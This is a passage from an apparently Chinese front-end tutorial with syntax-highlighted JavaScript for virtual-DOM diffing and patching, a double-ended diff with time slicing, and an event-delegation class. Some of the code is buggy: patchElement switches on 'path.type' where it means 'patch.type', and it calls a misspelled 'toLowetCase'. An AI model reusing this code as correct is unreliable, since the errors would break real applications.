    <span class="hljs-comment">// 使用key映射优化查找</span>
    <span class="hljs-keyword">const</span> oldKeyMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    oldChildren.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">child, index</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (child.<span class="hljs-property">key</span> != <span class="hljs-literal">null</span>) {
        oldKeyMap.<span class="hljs-title function_">set</span>(child.<span class="hljs-property">key</span>, { child, index });
      }
    });

    <span class="hljs-keyword">let</span> lastIndex = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> newChildrenPatches = [];

    <span class="hljs-comment">// 遍历新子节点</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; newChildren.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> newChild = newChildren[i];
      <span class="hljs-keyword">const</span> newKey = newChild.<span class="hljs-property">key</span>;

      <span class="hljs-keyword">let</span> oldChildIndex = -<span class="hljs-number">1</span>;
      <span class="hljs-keyword">let</span> oldChild = <span class="hljs-literal">null</span>;

      <span class="hljs-comment">// 通过key查找旧节点</span>
      <span class="hljs-keyword">if</span> (newKey != <span class="hljs-literal">null</span> &amp;&amp; oldKeyMap.<span class="hljs-title function_">has</span>(newKey)) {
        <span class="hljs-keyword">const</span> item = oldKeyMap.<span class="hljs-title function_">get</span>(newKey);
        oldChildIndex = item.<span class="hljs-property">index</span>;
        oldChild = item.<span class="hljs-property">child</span>;
        oldKeyMap.<span class="hljs-title function_">delete</span>(newKey); <span class="hljs-comment">// 从map中移除, 后续剩下的就是需要删除的</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 如果没有key, 尝试通过位置查找(效率较低)</span>
        oldChildIndex = i &lt; oldChildren.<span class="hljs-property">length</span> ? i : -<span class="hljs-number">1</span>;
        oldChild = oldChildIndex !== -<span class="hljs-number">1</span> ? oldChildren[oldChildIndex] : <span class="hljs-literal">null</span>;

        <span class="hljs-comment">// 检查类型是否匹配</span>
        <span class="hljs-keyword">if</span> (oldChild &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isDifferentType</span>(oldChild, newChild)) {
          oldChild = <span class="hljs-literal">null</span>;
          oldChildIndex = -<span class="hljs-number">1</span>;
        }
      }

      <span class="hljs-comment">// 递归比较子节点</span>
      <span class="hljs-keyword">const</span> childPath = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">diff</span>(oldChild, newChild);

      <span class="hljs-keyword">if</span> (childPath) {
        newChildrenPatches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">index</span>: i,
          <span class="hljs-attr">oldIndex</span>: oldChildIndex,
          <span class="hljs-attr">patch</span>: childPath,
        });
      }

      <span class="hljs-comment">// 判断是否需要移动</span>
      <span class="hljs-keyword">if</span> (oldChildIndex !== -<span class="hljs-number">1</span>) {
        <span class="hljs-keyword">if</span> (oldChildIndex &lt; lastIndex) {
          <span class="hljs-comment">// 需要移动</span>
          patches.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"MOVE"</span>,
            <span class="hljs-attr">fromIndex</span>: oldChildIndex,
            <span class="hljs-attr">toIndex</span>: i,
          });
        }
        lastIndex = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(lastIndex, oldChildIndex);
      }
    }

    <span class="hljs-comment">// 处理需要删除的旧节点</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> { child, index } <span class="hljs-keyword">of</span> oldKeyMap.<span class="hljs-title function_">values</span>()) {
      patches.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">"REMOVE_CHILD"</span>,
        index,
      });
    }

    <span class="hljs-comment">// 添加子节点补丁</span>
    patches.<span class="hljs-title function_">push</span>(...newChildrenPatches);

    <span class="hljs-keyword">return</span> patches;
  }

  <span class="hljs-comment">// 应用补丁到真实DOM</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">patch</span>(<span class="hljs-params">parent, patches</span>) {
    <span class="hljs-keyword">if</span> (!patches) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">switch</span> (patches.<span class="hljs-property">type</span>) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">"CREATE"</span>:
        <span class="hljs-keyword">const</span> newEl = patches.<span class="hljs-property">vnode</span>.<span class="hljs-title function_">render</span>();
        parent.<span class="hljs-title function_">appendChild</span>(newEl);
        patches.<span class="hljs-property">vnode</span>.<span class="hljs-property">el</span> = newEl;
        <span class="hljs-keyword">break</span>;

      <span class="hljs-keyword">case</span> <span class="hljs-string">"REMOVE"</span>:
        <span class="hljs-keyword">if</span> (parent.<span class="hljs-property">parentNode</span>) {
          parent.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(parent);
        }
        <span class="hljs-keyword">break</span>;

      <span class="hljs-keyword">case</span> <span class="hljs-string">"REPLACE"</span>:
        <span class="hljs-keyword">const</span> oldEl = patches.<span class="hljs-property">oldVNode</span>.<span class="hljs-property">el</span>;
        <span class="hljs-keyword">const</span> newEl2 = patches.<span class="hljs-property">newVNode</span>.<span class="hljs-title function_">render</span>();
        oldEl.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">replaceChild</span>(newEl2, oldEl);
        patches.<span class="hljs-property">newVNode</span>.<span class="hljs-property">el</span> = newEl2;
        <span class="hljs-keyword">break</span>;

      <span class="hljs-keyword">case</span> <span class="hljs-string">"UPDATE_TEXT"</span>:
        patches.<span class="hljs-property">oldVNode</span>.<span class="hljs-property">textContent</span> = patches.<span class="hljs-property">newVNode</span>.<span class="hljs-property">props</span>.<span class="hljs-property">nodeValue</span>;
        patches.<span class="hljs-property">newVNode</span>.<span class="hljs-property">el</span> = patches.<span class="hljs-property">oldVNode</span>.<span class="hljs-property">el</span>;
        <span class="hljs-keyword">break</span>;

      <span class="hljs-keyword">case</span> <span class="hljs-string">"UPDATE_ELEMENT"</span>:
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">patchElement</span>(patches.<span class="hljs-property">oldVNode</span>.<span class="hljs-property">el</span>, patches);
        patches.<span class="hljs-property">vnode</span>.<span class="hljs-property">el</span> = patches.<span class="hljs-property">oldVNode</span>.<span class="hljs-property">el</span>;
        <span class="hljs-keyword">break</span>;
    }
  }

  <span class="hljs-comment">// 应用元素级别的补丁</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">patchElement</span>(<span class="hljs-params">el, patches</span>) {
    <span class="hljs-comment">// 应用属性补丁</span>
    <span class="hljs-keyword">if</span> (patches.<span class="hljs-property">props</span>) {
      patches.<span class="hljs-property">props</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">patch</span>) =&gt;</span> {
        <span class="hljs-keyword">switch</span> (path.<span class="hljs-property">type</span>) {
          <span class="hljs-keyword">case</span> <span class="hljs-string">"UPDATE_PROP"</span>:
            <span class="hljs-keyword">if</span> (patch.<span class="hljs-property">key</span> === <span class="hljs-string">"className"</span>) {
              el.<span class="hljs-property">className</span> = patch.<span class="hljs-property">value</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (
              patch.<span class="hljs-property">key</span> === <span class="hljs-string">"style"</span> &amp;&amp;
              <span class="hljs-keyword">typeof</span> patch.<span class="hljs-property">value</span> === <span class="hljs-string">"object"</span>
            ) {
              <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(el.<span class="hljs-property">style</span>, patch.<span class="hljs-property">value</span>);
            } <span class="hljs-keyword">else</span> {
              el.<span class="hljs-title function_">setAttribute</span>(patch.<span class="hljs-property">key</span>, patch.<span class="hljs-property">value</span>);
            }
            <span class="hljs-keyword">break</span>;
          <span class="hljs-keyword">case</span> <span class="hljs-string">"REMOVE_PROP"</span>:
            el.<span class="hljs-title function_">removeAttribute</span>(patch.<span class="hljs-property">key</span>);
            <span class="hljs-keyword">break</span>;
          <span class="hljs-keyword">case</span> <span class="hljs-string">"UPDATE_EVENT"</span>:
            <span class="hljs-keyword">const</span> eventName = patch.<span class="hljs-property">key</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">toLowetCase</span>();
            <span class="hljs-keyword">if</span> (patch.<span class="hljs-property">oldValue</span>) {
              el.<span class="hljs-title function_">removeEventListener</span>(eventName, patch.<span class="hljs-property">oldValue</span>);
            }
            <span class="hljs-keyword">if</span> (patch.<span class="hljs-property">newValue</span>) {
              el.<span class="hljs-title function_">addEventListener</span>(eventName, patch.<span class="hljs-property">newValue</span>);
            }
            <span class="hljs-keyword">break</span>;
        }
      });
    }

    <span class="hljs-comment">// 应用子节点补丁</span>
    <span class="hljs-keyword">if</span> (patches.<span class="hljs-property">children</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">patchChildren</span>(el, patches.<span class="hljs-property">children</span>);
    }
  }

  <span class="hljs-comment">// 应用子节点补丁</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">patchChildren</span>(<span class="hljs-params">parent, patches</span>) {
    <span class="hljs-keyword">const</span> childNodes = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(parent.<span class="hljs-property">childNodes</span>);

    patches.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">patch</span>) =&gt;</span> {
      <span class="hljs-keyword">switch</span> (patch.<span class="hljs-property">type</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">"MOVE"</span>:
          <span class="hljs-keyword">const</span> childToMove = childNodes[patch.<span class="hljs-property">fromIndex</span>];
          <span class="hljs-keyword">const</span> referenceNode = childNodes[patch.<span class="hljs-property">toIndex</span>] || <span class="hljs-literal">null</span>;
          parent.<span class="hljs-title function_">insertBefore</span>(childToMove, referenceNode);
          <span class="hljs-keyword">break</span>;

        <span class="hljs-keyword">case</span> <span class="hljs-string">"REMOVE_CHILD"</span>:
          <span class="hljs-keyword">const</span> childToRemove = childNodes[patch.<span class="hljs-property">index</span>];
          <span class="hljs-keyword">if</span> (childToRemove) {
            parent.<span class="hljs-title function_">removeChild</span>(childToRemove);
          }
          <span class="hljs-keyword">break</span>;
        <span class="hljs-attr">default</span>:
          <span class="hljs-keyword">if</span> (patch.<span class="hljs-property">patch</span>) {
            <span class="hljs-keyword">const</span> childEl =
              childNodes[patch.<span class="hljs-property">oldIndex</span>] || parent.<span class="hljs-property">childNodes</span>[patch.<span class="hljs-property">index</span>];
            <span class="hljs-keyword">if</span> (childEl) {
              <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">patch</span>(childEl, patch.<span class="hljs-property">patch</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (patch.<span class="hljs-property">patch</span>.<span class="hljs-property">type</span> === <span class="hljs-string">"CREATE"</span>) {
              <span class="hljs-keyword">const</span> newEl = patch.<span class="hljs-property">patch</span>.<span class="hljs-property">vnode</span>.<span class="hljs-title function_">render</span>();
              <span class="hljs-keyword">const</span> referenceNode = parent.<span class="hljs-property">childNodes</span>[patch.<span class="hljs-property">index</span>] || <span class="hljs-literal">null</span>;
              parent.<span class="hljs-title function_">insertBefore</span>(newEl, referenceNode);
            }
          }
          <span class="hljs-keyword">break</span>;
      }
    });
  }
}
</code></pre>
<h5 data-id="heading-9">3.2 Diff算法优化策略</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedDiff</span> {
  <span class="hljs-comment">// 双指针算法优化</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">optimizedDiff</span>(<span class="hljs-params">oldChilren, newChildren</span>) {
    <span class="hljs-keyword">let</span> oldStartIdx = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> oldEndIdx = oldChilren.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
    <span class="hljs-keyword">let</span> newStartIdx = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> newEndIdx = newChildren.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;

    <span class="hljs-keyword">let</span> oldStartVNode = oldChilren[oldStartIdx];
    <span class="hljs-keyword">let</span> oldEndVNode = oldChilren[oldEndIdx];
    <span class="hljs-keyword">let</span> newStartVNode = newChildren[newStartIdx];
    <span class="hljs-keyword">let</span> newEndVNode = newChildren[newEndIdx];

    <span class="hljs-keyword">const</span> patches = [];
    <span class="hljs-keyword">const</span> oldKeyToIdx = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createKeyMap</span>(oldChilren);

    <span class="hljs-keyword">while</span> (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) {
      <span class="hljs-comment">// 跳过已处理的节点</span>
      <span class="hljs-keyword">if</span> (!oldStartVNode) {
        oldStartVNode = oldChilren[++oldStartIdx];
        <span class="hljs-keyword">continue</span>;
      }
      <span class="hljs-keyword">if</span> (!oldEndVNode) {
        oldEndVNode = oldChilren[--oldEndIdx];
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-comment">// 四种比较情况</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sameVNode</span>(oldStartVNode, newStartVNode)) {
        <span class="hljs-comment">// 情况1: 头头比较</span>
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"UPDATE"</span>,
          <span class="hljs-attr">oldIdx</span>: oldStartIdx,
          <span class="hljs-attr">newIdx</span>: newStartIdx,
        });
        oldStartVNode = oldChilren[++oldStartIdx];
        newStartVNode = newChildren[++newStartIdx];
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sameVNode</span>(oldEndVNode, newEndVNode)) {
        <span class="hljs-comment">// 情况2: 尾尾比较</span>
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"UPDATE"</span>,
          <span class="hljs-attr">oldIdx</span>: oldEndIdx,
          <span class="hljs-attr">newIdx</span>: newEndIdx,
        });
        oldEndVNode = oldChilren[--oldEndIdx];
        newEndVNode = newChildren[--newEndIdx];
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sameVNode</span>(oldStartVNode, newEndVNode)) {
        <span class="hljs-comment">// 情况3: 头尾比较(需要移动)</span>
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"MOVE"</span>,
          <span class="hljs-attr">fromIdx</span>: oldStartIdx,
          <span class="hljs-attr">toIdx</span>: oldEndIdx,
        });
        oldStartVNode = oldChilren[++oldStartIdx];
        newEndVNode = newChildren[--newEndIdx];
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sameVNode</span>(oldEndVNode, newStartVNode)) {
        <span class="hljs-comment">// 情况4: 头尾比较(需要移动)</span>
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"MOVE"</span>,
          <span class="hljs-attr">fromIdx</span>: oldEndIdx,
          <span class="hljs-attr">toIdx</span>: oldStartIdx,
        });
        oldEndVNode = oldChilren[--oldEndIdx];
        newStartVNode = newChildren[++newStartIdx];
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 情况5: 通过key查找</span>
        <span class="hljs-keyword">const</span> idxInOld = oldKeyToIdx.<span class="hljs-title function_">get</span>(newStartVNode.<span class="hljs-property">key</span>);

        <span class="hljs-keyword">if</span> (idxInOld == <span class="hljs-literal">null</span>) {
          <span class="hljs-comment">// 新节点, 需要创建</span>
          patches.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"CREATE"</span>,
            <span class="hljs-attr">vnode</span>: newStartVNode,
            <span class="hljs-attr">idx</span>: newStartIdx,
          });
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-comment">// 找到对应节点, 需要移动</span>
          <span class="hljs-keyword">const</span> vnodeToMove = oldChilren[idxInOld];
          patches.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"MOVE"</span>,
            <span class="hljs-attr">fromIdx</span>: idxInOld,
            <span class="hljs-attr">toIdx</span>: newStartIdx,
          });
          <span class="hljs-comment">// 标记为已处理</span>
          oldChilren[idxInOld] = <span class="hljs-literal">undefined</span>;
        }

        newStartVNode = newChildren[++newStartIdx];
      }
    }

    <span class="hljs-comment">// 处理剩余节点</span>
    <span class="hljs-keyword">if</span> (oldStartIdx &gt; oldEndIdx) {
      <span class="hljs-comment">// 添加新节点</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = newStartIdx; i &lt;= newEndIdx; i++) {
        patches.<span class="hljs-title function_">push</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">"CREATE"</span>,
          <span class="hljs-attr">vnode</span>: newChildren[i],
          <span class="hljs-attr">idx</span>: i,
        });
      }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (newStartIdx &gt; newEndIdx) {
      <span class="hljs-comment">// 删除旧节点</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = oldStartIdx; i &lt;= oldEndIdx; i++) {
        <span class="hljs-keyword">if</span> (oldChilren[i]) {
          patches.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">"REMOVE"</span>,
            <span class="hljs-attr">idx</span>: i,
          });
        }
      }
    }

    <span class="hljs-keyword">return</span> patches;
  }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createKeyMap</span>(<span class="hljs-params">children</span>) {
    <span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    children.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">child, idx</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (child &amp;&amp; child.<span class="hljs-property">key</span> !== <span class="hljs-literal">null</span>) {
        map.<span class="hljs-title function_">set</span>(child.<span class="hljs-property">key</span>, idx);
      }
    });
    <span class="hljs-keyword">return</span> map;
  }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">sameVNode</span>(<span class="hljs-params">vnode1, vnode2</span>) {
    <span class="hljs-keyword">return</span> (
      vnode1 &amp;&amp; vnode2 &amp;&amp; vnode1.<span class="hljs-property">tag</span> === vnode2.<span class="hljs-property">tag</span> &amp;&amp; vnode1.<span class="hljs-property">key</span> === vnode2.<span class="hljs-property">key</span>
    );
  }

  <span class="hljs-comment">// 事件切片优化</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">timeSlicedDiff</span>(<span class="hljs-params">oldVNode, newVNode, callback, chunkSize = <span class="hljs-number">10</span></span>) {
    <span class="hljs-keyword">const</span> patches = [];
    <span class="hljs-keyword">const</span> queue = [{ oldVNode, newVNode, <span class="hljs-attr">path</span>: [] }];

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">processChunk</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> startTime = performance.<span class="hljs-title function_">now</span>();
      <span class="hljs-keyword">let</span> processed = <span class="hljs-number">0</span>;

      <span class="hljs-keyword">while</span> (queue.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; processed &lt; chunkSize) {
        <span class="hljs-keyword">const</span> { oldVNode, newVNode, path } = queue.<span class="hljs-title function_">shift</span>();
        <span class="hljs-keyword">const</span> patch = <span class="hljs-title class_">VirtualDOM</span>.<span class="hljs-title function_">diff</span>(oldVNode, newVNode);

        <span class="hljs-keyword">if</span> (patch) {
          patches.<span class="hljs-title function_">push</span>({ patch, path });
        }

        <span class="hljs-comment">// 添加子节点到队列</span>
        <span class="hljs-keyword">if</span> (oldVNode &amp;&amp; newVNode &amp;&amp; oldVNode.<span class="hljs-property">children</span> &amp;&amp; newVNode.<span class="hljs-property">children</span>) {
          <span class="hljs-keyword">const</span> maxLen = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(
            oldVNode.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>,
            newVNode.<span class="hljs-property">children</span>.<span class="hljs-property">length</span>
          );
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; maxLen; i++) {
            queue.<span class="hljs-title function_">push</span>({
              <span class="hljs-attr">oldVNode</span>: oldVNode.<span class="hljs-property">children</span>[i],
              <span class="hljs-attr">newVNode</span>: newVNode.<span class="hljs-property">children</span>[i],
              <span class="hljs-attr">path</span>: [...path, i],
            });
          }
        }

        processed++;

        <span class="hljs-comment">// 检查是否超过时间限制</span>
        <span class="hljs-keyword">if</span> (performance.<span class="hljs-title function_">now</span>() - startTime &gt; <span class="hljs-number">16</span>) {
          <span class="hljs-comment">// 约一帧的时间</span>
          <span class="hljs-keyword">break</span>;
        }
      }

      <span class="hljs-keyword">if</span> (queue.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 继续处理下一个chunk</span>
        <span class="hljs-title function_">requestIdleCallback</span>(processChunk);
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 完成，执行回调</span>
        <span class="hljs-title function_">callback</span>(patches);
      }
    }

    <span class="hljs-comment">// 开始处理</span>
    <span class="hljs-title function_">requestIdleCallback</span>(processChunk);
  }
}
</code></pre>
<h4 data-id="heading-10">四、事件委托高级模式</h4>
<h5 data-id="heading-11">4.1 完善的事件委托系统</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventDelegation</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">rootElement = <span class="hljs-variable language_">document</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span> = rootElement;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// Map&lt;eventType, Map&lt;selector, handler&gt;&gt;</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// Map&lt;eventType, listener&gt;</span>
  }
  
  <span class="hljs-comment">// 注册事件委托</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">eventType, selector, handler, options = {}</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">has</span>(eventType)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">set</span>(eventType, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
      
      <span class="hljs-comment">// 为每种事件类型添加一个事件监听器</span>
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">listener</span> = (<span class="hljs-params">event</span>) =&gt; {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleEvent</span>(eventType, event);
      };
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>.<span class="hljs-title function_">addEventListener</span>(eventType, listener, options);
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">set</span>(eventType, listener);
    }
    
    <span class="hljs-keyword">const</span> selectorMap = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">get</span>(eventType);
    selectorMap.<span class="hljs-title function_">set</span>(selector, handler);
  }
  
  <span class="hljs-comment">// 移除事件委托</span>
  <span class="hljs-title function_">off</span>(<span class="hljs-params">eventType, selector</span>) {
    <span class="hljs-keyword">const</span> selectorMap = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">get</span>(eventType);
    <span class="hljs-keyword">if</span> (selectorMap) {
      selectorMap.<span class="hljs-title function_">delete</span>(selector);
      
      <span class="hljs-comment">// 如果没有其他选择器，移除事件监听器</span>
      <span class="hljs-keyword">if</span> (selectorMap.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">const</span> listener = <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(eventType);
        <span class="hljs-keyword">if</span> (listener) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>.<span class="hljs-title function_">removeEventListener</span>(eventType, listener);
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">delete</span>(eventType);
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">delete</span>(eventType);
      }
    }
  }
  
  <span class="hljs-comment">// 处理事件</span>
  <span class="hljs-title function_">handleEvent</span>(<span class="hljs-params">eventType, event</span>) {
    <span class="hljs-keyword">const</span> selectorMap = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">get</span>(eventType);
    <span class="hljs-keyword">if</span> (!selectorMap) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 从目标元素向上查找匹配的选择器</span>
    <span class="hljs-keyword">let</span> element = event.<span class="hljs-property">target</span>;
    
    <span class="hljs-keyword">while</span> (element &amp;&amp; element !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>) {
      <span class="hljs-comment">// 检查所有选择器</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [selector, handler] <span class="hljs-keyword">of</span> selectorMap.<span class="hljs-title function_">entries</span>()) {
        <span class="hljs-keyword">if</span> (element.<span class="hljs-title function_">matches</span>(selector)) {
          <span class="hljs-comment">// 执行处理器</span>
          <span class="hljs-keyword">const</span> result = handler.<span class="hljs-title function_">call</span>(element, event);
          
          <span class="hljs-comment">// 如果处理器返回false，阻止默认行为和冒泡</span>
          <span class="hljs-keyword">if</span> (result === <span class="hljs-literal">false</span>) {
            event.<span class="hljs-title function_">preventDefault</span>();
            event.<span class="hljs-title function_">stopPropagation</span>();
          }
          
          <span class="hljs-comment">// 如果处理器返回true，继续检查父元素</span>
          <span class="hljs-keyword">if</span> (result !== <span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">return</span>;
          }
        }
      }
      
      element = element.<span class="hljs-property">parentElement</span>;
    }
  }
  
  <span class="hljs-comment">// 一次性事件</span>
  <span class="hljs-title function_">once</span>(<span class="hljs-params">eventType, selector, handler</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">onceHandler</span> = (<span class="hljs-params">event</span>) =&gt; {
      <span class="hljs-keyword">const</span> result = handler.<span class="hljs-title function_">call</span>(event.<span class="hljs-property">target</span>, event);
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(eventType, selector, onceHandler);
      <span class="hljs-keyword">return</span> result;
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(eventType, selector, onceHandler);
  }
  
  <span class="hljs-comment">// 动态添加支持</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">createDynamicDelegation</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> delegation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventDelegation</span>();
    
    <span class="hljs-comment">// 监听DOM变化，自动处理新元素</span>
    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mutation <span class="hljs-keyword">of</span> mutations) {
        <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'childList'</span>) {
          mutation.<span class="hljs-property">addedNodes</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">node</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
              delegation.<span class="hljs-title function_">bindNewElement</span>(node);
            }
          });
        }
      }
    });
    
    observer.<span class="hljs-title function_">observe</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, {
      <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>
    });
    
    <span class="hljs-keyword">return</span> delegation;
  }
  
  <span class="hljs-comment">// 绑定新元素</span>
  <span class="hljs-title function_">bindNewElement</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-comment">// 为元素绑定已注册的事件</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [eventType, selectorMap] <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">handlers</span>.<span class="hljs-title function_">entries</span>()) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [selector, handler] <span class="hljs-keyword">of</span> selectorMap.<span class="hljs-title function_">entries</span>()) {
        <span class="hljs-keyword">if</span> (element.<span class="hljs-title function_">matches</span>(selector)) {
          element.<span class="hljs-title function_">addEventListener</span>(eventType, handler);
        }
      }
    }
    
    <span class="hljs-comment">// 递归处理子元素</span>
    element.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'*'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
